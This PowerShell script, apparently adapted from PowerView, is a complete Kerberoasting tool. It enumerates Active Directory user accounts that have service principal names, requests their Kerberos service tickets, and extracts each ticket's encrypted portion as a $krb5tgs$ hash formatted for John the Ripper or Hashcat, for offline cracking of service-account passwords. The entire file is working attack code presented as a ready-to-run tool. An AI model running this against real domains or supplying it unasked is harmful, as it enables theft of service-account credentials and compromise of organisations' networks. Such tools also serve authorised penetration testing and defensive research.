function List-UserSPNs
{


    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$False,Position=1)]
    [string]$Domain = "",
    [Parameter(Mandatory=$False)]
    [string]$GroupName = "",
    [Parameter(Mandatory=$False)]
    [string]$DomainController = "",
    [Parameter(Mandatory=$False)]
    [switch]$ViewAll
    )
    Add-Type -AssemblyName System.IdentityModel
    $GCs = @()
    if ( $DomainController )
    {
        $GCs += $DomainController
    }   
    elseif ( $Domain )
    {
        $GCs += $Domain
    }
    else # find them
    {
        $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        $ForestSid = (New-Object System.Security.Principal.NTAccount($ForestObject.RootDomain,"krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value
        $Parts = $ForestSid -Split "-"
        $ForestSid = $Parts[0..$($Parts.length-2)] -join "-"
        $ForestObject | Add-Member NoteProperty 'RootDomainSid' $ForestSid
        $ForestObject.Domains | % { $GCs += $_.Name }
    }
    $GCs = $GCs | Select -uniq
    if ( -not $GCs )
    {
    	# no Global Catalogs Found
    	Write-Output "No Global Catalogs Found!"
    	Exit
    }
    

    $uniqueAccounts = New-Object System.Collections.ArrayList
    ForEach ( $GC in $GCs )
    {
    	$searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.SearchRoot = "LDAP://" + $GC
    	$searcher.PageSize = 1000
    	$searcher.Filter = "(&(!objectClass=computer)(servicePrincipalName=*))"
    	$searcher.PropertiesToLoad.Add("serviceprincipalname") | Out-Null
    	$searcher.PropertiesToLoad.Add("name") | Out-Null
    	$searcher.PropertiesToLoad.Add("userprincipalname") | Out-Null
        $searcher.PropertiesToLoad.Add("memberof") | Out-Null
        $searcher.PropertiesToLoad.Add("distinguishedname") | Out-Null
        $searcher.PropertiesToLoad.Add("pwdlastset") | Out-Null
        $searcher.PropertiesToLoad.Add("whencreated") | Out-Null
        $searcher.PropertiesToLoad.Add("samaccountname") | Out-Null
    	$searcher.SearchScope = "Subtree"
    	$results = $searcher.FindAll()
    	foreach ( $result in $results )
        {
            foreach ( $spn in $result.Properties["serviceprincipalname"] )
            {
                $groups = $result.properties.memberof
                $distingName = $result.Properties["distinguishedname"][0].ToString()
                if ( $viewAll -eq $False )
                {
                    if ( $uniqueAccounts.contains($distingName) )
                    {
                        continue
                    }
                    else
                    {
                        [void]$uniqueAccounts.add($distingName)
                    }
                }
                if ( $Groups -like "*$GroupName*" )
                {
                    Select-Object -InputObject $result -Property `
                    @{Name="SPN"; Expression={$spn.ToString()} }, `
                    @{Name="Name";                 Expression={$result.Properties["name"][0].ToString()} }, `
                    @{Name="SamAccountName";       Expression={$result.Properties["samaccountname"][0].ToString()} }, `
                    @{Name="UserPrincipalName";    Expression={$result.Properties["userprincipalname"][0].ToString()} }, `
                    @{Name="DistinguishedName";    Expression={$distingName} }, `
                    @{Name="MemberOf";             Expression={$groups} }, `
                    @{Name="PasswordLastSet";      Expression={[datetime]::fromFileTime($result.Properties["pwdlastset"][0])} }, `
                    @{Name="whencreated";          Expression={$result.Properties["whencreated"][0].ToString()} } 
                }
            }
    	}
    }
}
function Invoke-AutoKerberoast
{


    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [string]$GroupName = "",
        [Parameter(Mandatory=$False)]
        [string]$Domain = "",
        [Parameter(Mandatory=$False)]
        [string]$DomainController = "",
        [Parameter(Mandatory=$False)]
        [string[]]$SPN,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]$HashFormat = "Hashcat",
        [Parameter(Mandatory=$False)]
        [Switch]$Mask
    )
    $SPNsArray = New-Object System.Collections.ArrayList
    $DnameArray = New-Object System.Collections.ArrayList
    $SnameArray = New-Object System.Collections.ArrayList
    if ( $SPN )
    {
        ForEach ($i in $SPN)
        {
            try
            {
                [void]$SPNsArray.Add($i)
            }
            catch
            {
                Write-Output "Something went wrong while parsing the SPN $i from the array"
                exit
            }
        }
    }
    else
    {
        $SPNs = List-UserSPNs -Group $GroupName -Domain $Domain -DomainController $DomainController | Select SPN, SamAccountName, DistinguishedName
        if ( ! $SPNs )
        {
            write-output "Unable to obtain any user account SPNs"
            exit
        }
        $SPNs | % { [void]$SPNsArray.Add($_.SPN) }
        $SPNs | % { [void]$SnameArray.Add($_.SamAccountName) }
        $SPNs | % { [void]$DnameArray.Add($_.DistinguishedName) }
    }
    while ( $SPNsArray.contains("kadmin/changepw") )
    {
        $DnameArray.RemoveAt($SPNsArray.IndexOf("kadmin/changepw"))
        $SnameArray.RemoveAt($SPNsArray.IndexOf("kadmin/changepw"))
        $SPNsArray.Remove("kadmin/changepw")
    }
    if ( $SPNsArray.Count -eq 0 )
    {
        Write-Output "Unable to Identify any SPNs that use User accounts in this domain."
        exit
    }
    else
    {
        Write-Output "Requested Tickets:"
        $i = 1
        ForEach ( $currentSPN in $SPNsArray )
        {
            "ID#$i`:"
            "SPN: $currentSPN"
            "SAMACCOUNTNAME: " + $SnameArray[$i-1]
            "DISTINGUISHED NAME: " + $DnameArray[$i-1] + "`n"
            $i++
        }
    }
    $i = 0
    $ticketArray = New-Object System.Collections.ArrayList
    $failedTicketArray = New-Object System.Collections.ArrayList
    ForEach ( $currentSPN in $SPNsArray )
    {
        $currentSamAccountName = $SnameArray[$i]
        $currentDistringuishedName = $DnameArray[$i]
        $currentLabel = "SAMACCOUNTNAME: $currentSamAccountName; DISTINGUISHEDNAME: $currentDistringuishedName" 
        try
        {
            if ( $Mask )
            {
                $currentHash = Get-SPNTicket -SPN $currentSPN -IdNum ($i+1) -userLabel $currentLabel -OutputFormat $HashFormat -Mask | select -expand hash
            }
            else
            {
                $currentHash = Get-SPNTicket -SPN $currentSPN -IdNum ($i+1) -userLabel $currentLabel -OutputFormat $HashFormat | select -expand hash
            }
            [void]$ticketArray.Add($currentHash)
        }
        catch
        {
            $failedTicketLabel = "ID#" + ($i+1) + "_SPN: $currentSPN"
            [void]$failedTicketArray.Add($failedTicketLabel)
        }
        $i += 1
    }
    Write-Output "`n`nCaptured TGS hashes:"
    $ticketArray | % { "$_`n" }
    if ( $failedTicketArray )
    {
        Write-Output "`n`nWARNING: failed to capture hashes for the following SPNs:"
        $failedTicketArray
    }
}
function Get-SPNTicket {


    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName='RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]$SPN,
        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]$User,
        [Parameter(Position = 1)]
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]$OutputFormat='Hashcat',
        [Parameter(Mandatory=$False)]
        [String]
        $IdNum="",
        [Parameter(Mandatory=$False)]
        [Switch]$Mask,
        [Parameter(Mandatory=$False)]
        [String]$userLabel = ""
    )
    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
    }
    PROCESS {
        if ($PSBoundParameters['User']) {
            $TargetObject = $User
        }
        else {
            $TargetObject = $SPN
        }
        ForEach ($Object in $TargetObject) {
            if ($PSBoundParameters['User']) {
                $UserSPN = $Object.ServicePrincipalName
                $SamAccountName = $Object.SamAccountName
                $DistinguishedName = $Object.DistinguishedName
            }
            else {
                $UserSPN = $Object
                $SamAccountName = $Null
                $DistinguishedName = $Null
            }
            $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
            $TicketByteStream = $Ticket.GetRequest()
            if ($TicketByteStream) {
                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
                [System.Collections.ArrayList]$Parts = ($TicketHexStream -replace '^(.*?)04820...(.*)','$2') -Split 'A48201'
                $Parts.RemoveAt($Parts.Count - 1)
                $Hash = $Parts -join 'A48201'
                $Hash = $Hash.Insert(32, '$')
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName
                $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName
                if ($OutputFormat -match 'John') {
                    if ( $Mask )
                    {
                        $HashFormat = "`$krb5tgs`$ID#" + $IdNum + "_`:$Hash"
                    }
                    else
                    {
                        $userLabel = $userLabel -replace "`:","_"
                        $SPN = $SPN -replace "`:","_"
                        $HashFormat = "`$krb5tgs`$ID#" + $IdNum + "_" + $userLabel + " SPN_$SPN`:$Hash"
                    }
                }
                else {
                    if ( $Mask )
                    {
                        $HashFormat = "`$krb5tgs`$23`$*ID#" + $IdNum + "_*`$" + $Hash
                    }
                    else
                    {
                        $HashFormat = "`$krb5tgs`$23`$*ID#" + $IdNum + "_" + $userLabel + " SPN: $SPN *`$" + $Hash
                    }
                }
                $Out | Add-Member Noteproperty 'Hash' $HashFormat
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                Write-Output $Out
                break
            }
        }
    }
}
